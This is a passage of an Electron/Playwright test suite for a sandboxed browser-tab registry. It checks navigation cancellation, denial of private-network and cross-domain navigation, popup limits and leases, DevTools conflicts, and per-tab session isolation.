        }
        electron.app.on('web-contents-created', intercept)
        const navigation = registry
          .dispatch({ kind: 'navigate', tabId, input: `${url}/stall` })
          .then(
            () => 'committed',
            () => 'cancelled'
          )
        await started
        stagedContents!.close({ waitForBeforeUnload: false })
        const outcome = await Promise.race([
          navigation,
          new Promise<string>((resolve) => setTimeout(() => resolve('pending'), 2_000)),
        ])
        return {
          outcome,
          sameTarget: registry.target(tabId) === original,
          stagedDestroyed: stagedContents!.isDestroyed(),
        }
      }, origin)
      assert.deepEqual(result, { outcome: 'cancelled', sameTarget: true, stagedDestroyed: true })
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a later failed visit to a former download URL is not hidden by its handoff',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((request, response) => {
      if (request.url !== '/file') {
        response.setHeader('Content-Type', 'text/html')
        response.end('<title>Page</title>')
        return
      }
      response.setHeader('Content-Disposition', 'attachment; filename="file.txt"')
      response.end('download')
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-download-stale-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open', input: `${url}/page` })
        const tabId = registry.snapshot().activeTabId!
        const contents = registry.target(tabId)
        contents.session.on('will-download', (_event, item) => item.cancel())
        await registry.dispatch({ kind: 'navigate', tabId, input: `${url}/file` })
        const restored = new Promise<void>((resolve) => {
          const onNavigate = (_event: Electron.Event, destination: string) => {
            if (destination !== `${url}/page?again`) return
            contents.removeListener('did-navigate', onNavigate)
            resolve()
          }
          contents.on('did-navigate', onNavigate)
        })
        void contents
          .executeJavaScript(`location.href = ${JSON.stringify(`${url}/page?again`)}`)
          .catch(() => undefined)
        await restored
        contents.emit('did-fail-load', {} as Electron.Event, -2, 'ERR_FAILED', `${url}/file`, true)
        return registry.snapshot().tabs[0]?.navigationError
      }, origin)
      assert.equal(result, 'navigation_failed')
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'DevTools claims its tab before debugger detach observers can reattach',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-devtools-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async (electron) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        registry.attach(tabId)
        const events: { reason: string; retry: string }[] = []
        registry.onDebuggerDetach((_tabId, reason) => {
          let retry = 'attached'
          try {
            registry.attach(tabId)
          } catch (error) {
            retry = String(error)
          }
          events.push({ reason, retry })
        })
        await registry.dispatch({ kind: 'devtools', tabId, open: true })
        const snapshot = registry.snapshot()
        const main = browserWindow.webContents.isDevToolsOpened()
        await registry.dispatch({ kind: 'close', tabId })
        return {
          events,
          snapshot,
          main,
          windowCount: electron.BrowserWindow.getAllWindows().length,
        }
      })
      assert.equal(result.main, false)
      assert.equal(result.windowCount, 1)
      assert.ok(
        result.events.some(
          (event) =>
            event.reason === 'devtools_conflict' && event.retry.includes('devtools_conflict')
        )
      )
      assert.equal(result.snapshot.tabs[0].cdpStatus, 'devtools_conflict')
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'denied cross-domain navigation preserves the original local page and history',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => {
      response.setHeader('Content-Type', 'text/html')
      response.end('<title>Local page</title>')
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-denied-navigation-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      application = await launchRegistryProbe(origin, temporary)
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const first = await registry.dispatch({ kind: 'open', input: url + '/first' })
        const tabId = first.activeTabId!
        await registry.dispatch({ kind: 'navigate', tabId, input: url + '/second' })
        const original = registry.target(tabId)
        const before = registry.snapshot().tabs[0]
        let error = ''
        try {
          await registry.dispatch({ kind: 'navigate', tabId, input: 'http://127.0.0.1:1/denied' })
        } catch (caught) {
          error = String(caught)
        }
        const after = registry.snapshot().tabs[0]
        return {
          error,
          samePage: registry.target(tabId) === original,
          destroyed: original.isDestroyed(),
          before: { url: before.url, title: before.title, canGoBack: before.canGoBack },
          after: { url: after.url, title: after.title, canGoBack: after.canGoBack },
        }
      }, origin)
      assert.match(result.error, /permission_denied/)
      assert.equal(result.samePage, true)
      assert.equal(result.destroyed, false)
      assert.deepEqual(result.after, {
        url: origin + '/second',
        title: 'Local page',
        canGoBack: true,
      })
      assert.deepEqual(result.after, result.before)
    } finally {
      await application?.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'DNS-private alias denied by the real proxy preserves the original local page and history',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((incoming, response) => {
      if (incoming.url === '/forbidden') response.statusCode = 403
      if (incoming.url === '/forbidden')
        response.setHeader('x-scholarseed-proxy-error', 'permission_denied')
      response.setHeader('Content-Type', 'text/html')
      response.end(
        incoming.url === '/forbidden' ? '<title>Site 403</title>' : '<title>Local page</title>'
      )
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-private-alias-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      application = await launchRegistryProbe(origin, temporary, true)
      const result = await application.evaluate(async (_electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        const first = await registry.dispatch({ kind: 'open', input: url + '/first' })
        const tabId = first.activeTabId!
        await registry.dispatch({ kind: 'navigate', tabId, input: url + '/second' })
        const original = registry.target(tabId)
        const before = registry.snapshot().tabs[0]
        let error = ''
        try {
          await registry.dispatch({
            kind: 'navigate',
            tabId,
            input: 'http://private-alias.example/denied',
          })
        } catch (caught) {
          error = String(caught)
        }
        const after = registry.snapshot().tabs[0]
        await registry.dispatch({ kind: 'open' })
        const remoteTabId = registry.snapshot().activeTabId!
        const remotePage = registry.target(remoteTabId)
        await registry.dispatch({ kind: 'navigate', tabId: remoteTabId, input: url + '/forbidden' })
        const siteForbidden = registry.snapshot().tabs.find((tab) => tab.tabId === remoteTabId)!
        return {
          error,
          lookups: (globalThis as unknown as { privateLookupCount: number }).privateLookupCount,
          samePage: registry.target(tabId) === original,
          destroyed: original.isDestroyed(),
          before: { url: before.url, title: before.title, canGoBack: before.canGoBack },
          after: { url: after.url, title: after.title, canGoBack: after.canGoBack },
          siteForbidden: {
            committed: registry.target(remoteTabId) !== remotePage,
            url: siteForbidden.url,
            title: siteForbidden.title,
          },
        }
      }, origin)
      assert.ok(result.lookups > 0, 'the proxy must resolve the public-looking hostname')
      assert.match(result.error, /permission_denied/)
      assert.equal(result.samePage, true)
      assert.equal(result.destroyed, false)
      assert.deepEqual(result.after, result.before)
      assert.deepEqual(result.siteForbidden, {
        committed: true,
        url: origin + '/forbidden',
        title: 'Site 403',
      })
    } finally {
      await application?.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'failed cross-domain upstream preserves the original remote page',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_incoming, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-failed-transition-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    let fixtureClosed = false
    try {
      application = await launchRegistryProbe(origin, temporary)
      await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        await (globalThis as unknown as BrowserFixture).registry.dispatch({ kind: 'open' })
      })
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      fixtureClosed = true
      const result = await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const tabId = registry.snapshot().activeTabId!
        const original = registry.target(tabId)
        const before = registry.snapshot().tabs[0]
        let error = ''
        try {
          await registry.dispatch({ kind: 'navigate', tabId, input: url + '/unreachable' })
        } catch (caught) {
          error = String(caught)
        }
        return {
          error,
          samePage: registry.target(tabId) === original,
          destroyed: original.isDestroyed(),
          before,
          after: registry.snapshot().tabs[0],
        }
      }, origin)
      assert.match(result.error, /navigation_failed/)
      assert.equal(result.samePage, true)
      assert.equal(result.destroyed, false)
      assert.deepEqual(result.after, result.before)
    } finally {
      await application?.close()
      if (!fixtureClosed) {
        fixture.closeAllConnections()
        await new Promise<void>((resolve) => fixture.close(() => resolve()))
      }
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test('local page popups cannot create an unauthorized blank tab', { timeout: 30_000 }, async () => {
  const fixture = createServer((_request, response) => response.end('<title>Local page</title>'))
  fixture.listen(0, '127.0.0.1')
  await once(fixture, 'listening')
  const address = fixture.address()
  assert.ok(address && typeof address !== 'string')
  const origin = `http://127.0.0.1:${address.port}`
  const temporary = await mkdtemp(join(tmpdir(), 'browser-local-popup-'))
  const application = await launchRegistryProbe(origin, temporary)
  try {
    const result = await application.evaluate(async (_electron, url) => {
      await (globalThis as unknown as BrowserFixture).ready
      const { registry } = globalThis as unknown as BrowserFixture
      await registry.dispatch({ kind: 'open', input: `${url}/local` })
      const originalTabId = registry.snapshot().activeTabId
      await registry
        .target(originalTabId!)
        .executeJavaScript(`window.open(${JSON.stringify(`${url}/popup`)}); null`)
      await registry
        .target(originalTabId!)
        .executeJavaScript("window.open('https://example.org/popup'); null")
      await new Promise((resolve) => setTimeout(resolve, 300))
      return {
        originalTabId,
        activeTabId: registry.snapshot().activeTabId,
        tabs: registry.snapshot().tabs.length,
      }
    }, origin)
    assert.equal(result.tabs, 1)
    assert.equal(result.activeTabId, result.originalTabId)
  } finally {
    await application.close()
    fixture.closeAllConnections()
    await new Promise<void>((resolve) => fixture.close(() => resolve()))
    await rm(temporary, { recursive: true, force: true })
  }
})

test(
  'Agent popup leases block window.open until every lease is released',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-popup-fence-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const sourceTabId = registry.snapshot().activeTabId!
        const source = registry.target(sourceTabId)
        const popupUrl = 'https://example.org/popup'
        const blocked = registry.blockAgentPopups(sourceTabId)
        const alsoBlocked = registry.blockAgentPopups(sourceTabId)
        await source.executeJavaScript(`window.open(${JSON.stringify(popupUrl)}); null`)
        const whileBlocked = registry.snapshot().tabs.length
        blocked()
        blocked()
        await source.executeJavaScript(`window.open(${JSON.stringify(popupUrl)}); null`)
        const afterOneRelease = registry.snapshot().tabs.length
        alsoBlocked()
        await source.executeJavaScript(`window.open(${JSON.stringify(popupUrl)}); null`)
        for (let attempt = 0; attempt < 100 && registry.snapshot().tabs.length < 2; attempt += 1) {
          await new Promise((resolve) => setTimeout(resolve, 10))
        }
        return { whileBlocked, afterOneRelease, afterAllReleased: registry.snapshot().tabs.length }
      })
      assert.deepEqual(result, { whileBlocked: 1, afterOneRelease: 1, afterAllReleased: 2 })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'a stale Agent popup lease cannot release the replacement tab lease',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-popup-replace-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const sourceTabId = registry.snapshot().activeTabId!
        const source = registry.target(sourceTabId)
        const oldLease = registry.blockAgentPopups(sourceTabId)
        const prototype = Object.getPrototypeOf(source) as {
          loadURL: (url: string) => Promise<void>
          setWindowOpenHandler: (handler: (details: { url: string }) => unknown) => void
        }
        const originalPrototypeLoad = prototype.loadURL
        const originalHandler = prototype.setWindowOpenHandler
        let popupHandler: ((details: { url: string }) => unknown) | null = null
        prototype.setWindowOpenHandler = function (
          this: Electron.WebContents,
          handler: (details: { url: string }) => unknown
        ) {
          popupHandler = handler
          return originalHandler.call(this, handler)
        }
        prototype.loadURL = async function (this: Electron.WebContents, url: string) {
          Object.defineProperty(this, 'getURL', { value: () => url, configurable: true })
          this.emit('did-navigate', {} as Electron.Event, url, 200)
          this.emit('dom-ready')
        }
        try {
          await registry.agentNavigate(
            sourceTabId,
            'https://example.org/page',
            'https://example.org'
          )
          const replacement = registry.target(sourceTabId)
          const handler = popupHandler as ((details: { url: string }) => unknown) | null
          if (!handler) throw new Error('replacement_popup_handler_missing')
          const newLease = registry.blockAgentPopups(sourceTabId)
          oldLease()
          handler({ url: 'https://example.org/popup' })
          const afterOldRelease = registry.snapshot().tabs.length
          newLease()
          handler({ url: 'https://example.org/popup' })
          for (
            let attempt = 0;
            attempt < 100 && registry.snapshot().tabs.length < 2;
            attempt += 1
          ) {
            await new Promise((resolve) => setTimeout(resolve, 10))
          }
          return {
            replaced: replacement !== source,
            afterOldRelease,
            afterNewRelease: registry.snapshot().tabs.length,
          }
        } finally {
          prototype.setWindowOpenHandler = originalHandler
          prototype.loadURL = originalPrototypeLoad
        }
      })
      assert.deepEqual(result, { replaced: true, afterOldRelease: 1, afterNewRelease: 2 })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'closing a tab retires its Agent popup lease without affecting a new tab',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-agent-popup-close-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async () => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const oldTabId = registry.snapshot().activeTabId!
        const oldLease = registry.blockAgentPopups(oldTabId)
        await registry.dispatch({ kind: 'close', tabId: oldTabId })
        await registry.dispatch({ kind: 'open' })
        const newTabId = registry.snapshot().activeTabId!
        const newLease = registry.blockAgentPopups(newTabId)
        oldLease()
        await registry
          .target(newTabId)
          .executeJavaScript("window.open('https://example.org/popup'); null")
        const afterOldRelease = registry.snapshot().tabs.length
        newLease()
        await registry
          .target(newTabId)
          .executeJavaScript("window.open('https://example.org/popup'); null")
        for (let attempt = 0; attempt < 100 && registry.snapshot().tabs.length < 2; attempt += 1) {
          await new Promise((resolve) => setTimeout(resolve, 10))
        }
        return {
          distinctTabs: oldTabId !== newTabId,
          afterOldRelease,
          afterNewRelease: registry.snapshot().tabs.length,
        }
      })
      assert.deepEqual(result, { distinctTabs: true, afterOldRelease: 1, afterNewRelease: 2 })
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'failed public popup navigation does not retain a blank tab',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-failed-popup-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async (electron) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const originalTabId = registry.snapshot().activeTabId
        const contents = registry.target(originalTabId!)
        const failed = new Promise<void>((resolve) => {
          const onCreated = (_event: Electron.Event, popup: WebContents) => {
            if (popup === contents) return
            electron.app.removeListener('web-contents-created', onCreated)
            Object.defineProperty(popup, 'loadURL', {
              value: async () => {
                throw new Error('popup navigation failed')
              },
            })
            resolve()
          }
          electron.app.on('web-contents-created', onCreated)
        })
        await contents.executeJavaScript("window.open('https://example.org/popup'); null")
        await failed
        await new Promise((resolve) => setTimeout(resolve, 300))
        return {
          originalTabId,
          activeTabId: registry.snapshot().activeTabId,
          tabs: registry.snapshot().tabs.length,
        }
      })
      assert.equal(result.tabs, 1)
      assert.equal(result.activeTabId, result.originalTabId)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'popup admission is bounded without limiting manually opened tabs',
  { timeout: 30_000 },
  async () => {
    const temporary = await mkdtemp(join(tmpdir(), 'browser-popup-cap-'))
    const application = await launchRegistryProbe('', temporary)
    try {
      const result = await application.evaluate(async (electron) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const source = registry.target(registry.snapshot().activeTabId!)
        let created = 0
        const hold = (_event: Electron.Event, contents: WebContents) => {
          if (contents === source) return
          created += 1
          Object.defineProperty(contents, 'loadURL', {
            value: () => new Promise<void>(() => undefined),
          })
        }
        electron.app.on('web-contents-created', hold)
        await source.executeJavaScript(
          "for (let attempt = 0; attempt < 24; attempt++) window.open('https://example.org/popup'); null"
        )
        await new Promise((resolve) => setTimeout(resolve, 300))
        electron.app.removeListener('web-contents-created', hold)
        const afterPopups = registry.snapshot().tabs.length
        await registry.dispatch({ kind: 'open' })
        return { created, afterPopups, afterManual: registry.snapshot().tabs.length }
      })
      assert.equal(result.created, 8, JSON.stringify(result))
      assert.equal(result.afterPopups, 9, JSON.stringify(result))
      assert.equal(result.afterManual, result.afterPopups + 1)
    } finally {
      await application.close()
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test('closing a popup source cancels its pending child tab', { timeout: 30_000 }, async () => {
  const temporary = await mkdtemp(join(tmpdir(), 'browser-popup-source-close-'))
  const application = await launchRegistryProbe('', temporary)
  try {
    const result = await application.evaluate(async (electron) => {
      await (globalThis as unknown as BrowserFixture).ready
      const { registry } = globalThis as unknown as BrowserFixture
      await registry.dispatch({ kind: 'open' })
      const sourceTabId = registry.snapshot().activeTabId!
      const source = registry.target(sourceTabId)
      let childCreated!: () => void
      const created = new Promise<void>((resolve) => {
        childCreated = resolve
      })
      let releaseLoad!: () => void
      const hold = (_event: Electron.Event, contents: WebContents) => {
        if (contents === source) return
        electron.app.removeListener('web-contents-created', hold)
        Object.defineProperty(contents, 'loadURL', {
          value: () =>
            new Promise<void>((resolve) => {
              releaseLoad = resolve
              childCreated()
            }),
        })
      }
      electron.app.on('web-contents-created', hold)
      await source.executeJavaScript("window.open('https://example.org/popup'); null")
      await created
      await registry.dispatch({ kind: 'close', tabId: sourceTabId })
      const afterClose = registry.snapshot().tabs.length
      releaseLoad()
      await new Promise((resolve) => setTimeout(resolve, 100))
      return { afterClose, afterRelease: registry.snapshot().tabs.length }
    })
    assert.equal(result.afterClose, 0)
    assert.equal(result.afterRelease, 0)
  } finally {
    await application.close()
    await rm(temporary, { recursive: true, force: true })
  }
})

test(
  'replacing a popup source with a local view closes its pending child',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-popup-source-replace-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const sourceTabId = registry.snapshot().activeTabId!
        const source = registry.target(sourceTabId)
        let childCreated!: () => void
        const created = new Promise<void>((resolve) => {
          childCreated = resolve
        })
        const hold = (_event: Electron.Event, contents: WebContents) => {
          if (contents === source) return
          electron.app.removeListener('web-contents-created', hold)
          Object.defineProperty(contents, 'loadURL', {
            value: () =>
              new Promise<void>(() => {
                childCreated()
              }),
          })
        }
        electron.app.on('web-contents-created', hold)
        await source.executeJavaScript("window.open('https://example.org/popup'); null")
        await created
        await registry.dispatch({ kind: 'navigate', tabId: sourceTabId, input: `${url}/local` })
        return {
          tabs: registry.snapshot().tabs.length,
          sourceReplaced: registry.target(sourceTabId) !== source,
        }
      }, origin)
      assert.equal(result.sourceReplaced, true)
      assert.equal(result.tabs, 1)
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'replacing a popup view retains its admission until the tab closes',
  { timeout: 30_000 },
  async () => {
    const fixture = createServer((_request, response) => response.end('<title>Local page</title>'))
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-popup-slot-replace-'))
    const application = await launchRegistryProbe(origin, temporary)
    try {
      const result = await application.evaluate(async (electron, url) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const sourceTabId = registry.snapshot().activeTabId!
        const source = registry.target(sourceTabId)
        let firstCreated!: () => void
        const created = new Promise<void>((resolve) => {
          firstCreated = resolve
        })
        const first = (_event: Electron.Event, contents: WebContents) => {
          if (contents === source) return
          electron.app.removeListener('web-contents-created', first)
          Object.defineProperty(contents, 'getURL', { value: () => 'https://example.org/popup' })
          Object.defineProperty(contents, 'loadURL', {
            value: async () => {
              contents.emit('dom-ready')
              firstCreated()
            },
          })
        }
        electron.app.on('web-contents-created', first)
        await source.executeJavaScript("window.open('https://example.org/popup'); null")
        await created
        const popupTabId = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'navigate', tabId: popupTabId, input: `${url}/local` })
        let laterCreated = 0
        const hold = (_event: Electron.Event, contents: WebContents) => {
          laterCreated += 1
          Object.defineProperty(contents, 'loadURL', {
            value: () => new Promise<void>(() => undefined),
          })
        }
        electron.app.on('web-contents-created', hold)
        await source.executeJavaScript(
          "for (let attempt = 0; attempt < 16; attempt++) window.open('https://example.org/next'); null"
        )
        await new Promise((resolve) => setTimeout(resolve, 300))
        electron.app.removeListener('web-contents-created', hold)
        return { laterCreated, tabs: registry.snapshot().tabs.length }
      }, origin)
      assert.equal(result.laterCreated, 7, JSON.stringify(result))
      assert.equal(result.tabs, 9, JSON.stringify(result))
    } finally {
      await application.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

test(
  'real Electron registry isolates pages, prevents private requests and destroys owned views',
  { timeout: 120_000 },
  async () => {
    const hits: string[] = []
    let connections = 0
    const fixture = createServer((incoming, response) => {
      hits.push(incoming.url ?? '')
      if (incoming.url === '/redirect') {
        response.writeHead(302, {
          location: `http://localhost:${(fixture.address() as { port: number }).port}/redirect-target`,
        })
        response.end()
        return
      }
      if (incoming.url === '/download')
        response.setHeader('Content-Disposition', 'attachment; filename="blocked.txt"')
      response.setHeader('Content-Type', 'text/html')
      response.end('<title>Local fixture</title><h1>Local fixture</h1>')
    })
    fixture.on('connection', () => {
      connections += 1
    })
    fixture.listen(0, '127.0.0.1')
    await once(fixture, 'listening')
    const address = fixture.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'scholarseed-browser-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      application = await launchRegistryProbe(origin, temporary, true)
      const result = await application.evaluate(async (_electron) => {
        await (globalThis as unknown as BrowserFixture).ready
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const first = registry.snapshot().activeTabId!
        const page = registry.target(first)
        const preferences = (
          page as WebContents & { getLastWebPreferences(): WebPreferences }
        ).getLastWebPreferences()
        const isolation = {
          distinct: page.session !== browserWindow.webContents.session,
          persistent: page.session.isPersistent(),
          storagePath: page.session.storagePath,
          preload: preferences.preload,
          nodeIntegration: preferences.nodeIntegration,
          contextIsolation: preferences.contextIsolation,
          sandbox: preferences.sandbox,
        }
        await registry.dispatch({ kind: 'open' })
        const second = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'select', tabId: first })
        browserWindow.show()
        await registry.dispatch({
          kind: 'bounds',
          tabId: first,
          visible: true,
          x: 20,
          y: 30,
          width: 100,
          height: 90,
        })
        await registry.dispatch({
          kind: 'bounds',
          tabId: second,
          visible: true,
          x: 20,
          y: 30,
          width: 100,
          height: 90,
        })
        const firstView = browserWindow.contentView.children.find(
          (view) => (view as WebContentsView).webContents.id === page.id
        )!
        const secondView = browserWindow.contentView.children.find(
          (view) => (view as WebContentsView).webContents.id === registry.target(second).id
        )!
        const shown = {
          first: firstView.getVisible(),
          second: secondView.getVisible(),
          bounds: firstView.getBounds(),
        }
        browserWindow.hide()
        await registry.dispatch({
          kind: 'bounds',
          tabId: first,
          visible: true,
          x: 20,
          y: 30,
          width: 100,
          height: 90,
        })
        const hidden = {
          first: firstView.getVisible(),
          second: secondView.getVisible(),
          bounds: firstView.getBounds(),
        }
        browserWindow.show()
        await registry.dispatch({
          kind: 'bounds',
          tabId: first,
          visible: true,
          x: 20,
          y: 30,
          width: 100,
          height: 90,
        })
        const restored = firstView.getVisible()
        await registry.dispatch({ kind: 'select', tabId: second })
        const switched = { first: firstView.getVisible(), second: secondView.getVisible() }
        await registry.dispatch({ kind: 'select', tabId: first })
        const selected = registry.snapshot().activeTabId
        await registry.dispatch({ kind: 'close', tabId: second })
        let deniedMain = false
        try {
          registry.target(String(browserWindow.webContents.id))
        } catch {
          deniedMain = true
        }
        return {
          first,
          second,
          isolation,
          selected,
          deniedMain,
          pageId: page.id,
          count: registry.snapshot().tabs.length,
          shown,
          hidden,
          restored,
          switched,
        }
      })
      assert.notEqual(result.first, result.second)
      assert.equal(result.selected, result.first)
      assert.equal(result.count, 1)
      assert.equal(result.deniedMain, true)
      assert.deepEqual(result.shown, {
        first: true,
        second: false,
        bounds: { x: 20, y: 30, width: 100, height: 90 },
      })
      assert.deepEqual(result.hidden, {
        first: false,
        second: false,
        bounds: { x: 0, y: 0, width: 0, height: 0 },
      })
      assert.equal(result.restored, true)
      assert.deepEqual(result.switched, { first: false, second: true })
      assert.ok(
        result.isolation.storagePath?.startsWith(join(temporary, 'sessionData', 'Partitions'))
      )
      assert.deepEqual(
        { ...result.isolation, storagePath: undefined },
        {
          distinct: true,
          persistent: true,
          storagePath: undefined,
          preload: undefined,
          nodeIntegration: false,
          contextIsolation: true,
          sandbox: true,
        }
      )
      assert.equal(
        await application.evaluate(async (_electron, url) => {
          const { registry } = globalThis as unknown as BrowserFixture
          await registry.dispatch({
            kind: 'navigate',
            tabId: registry.snapshot().activeTabId!,
            input: url,
          })
          return registry.target(registry.snapshot().activeTabId!).getTitle()
        }, origin),
        'Local fixture'
      )
      const localIsolation = await application.evaluate(async (electron) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const page = registry.target(registry.snapshot().activeTabId!)
        let escaped = false
        try {
          await registry.navigate(registry.snapshot().activeTabId!, 'https://example.com/')
        } catch {
          escaped = true
        }
        return {
          pageId: page.id,
          persistent: page.session.isPersistent(),
          escaped,
          distinctFromDefault: page.session !== electron.session.defaultSession,
        }
      })
      assert.notEqual(localIsolation.pageId, result.pageId)
      assert.equal(localIsolation.persistent, false)
      assert.equal(localIsolation.distinctFromDefault, true)
      assert.equal(localIsolation.escaped, true)
      const transition = await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const previousLocalTabId = registry.snapshot().activeTabId!
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        const remotePage = registry.attach(tabId)
        const detached: string[] = []
        const unsubscribe = registry.onDebuggerDetach((target) => detached.push(target))
        await registry.dispatch({ kind: 'navigate', tabId, input: url })
        const localPage = registry.target(tabId)
        const outcome = {
          stableTab: registry.snapshot().activeTabId === tabId,
          remoteDestroyed: remotePage.isDestroyed(),
          detached: detached.includes(tabId),
          persistent: localPage.session.isPersistent(),
        }
        unsubscribe()
        await registry.dispatch({ kind: 'close', tabId: previousLocalTabId })
        return outcome
      }, origin)
      assert.deepEqual(transition, {
        stableTab: true,
        remoteDestroyed: true,
        detached: true,
        persistent: false,
      })
      assert.equal(
        await application.evaluate(async () => {
          const { registry } = globalThis as unknown as BrowserFixture
          return registry
            .target(registry.snapshot().activeTabId!)
            .executeJavaScript('Notification.requestPermission()')
        }),
        'denied'
      )
      const download = (await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const page = registry.target(registry.snapshot().activeTabId!)
        const cancelled = new Promise((resolve) =>
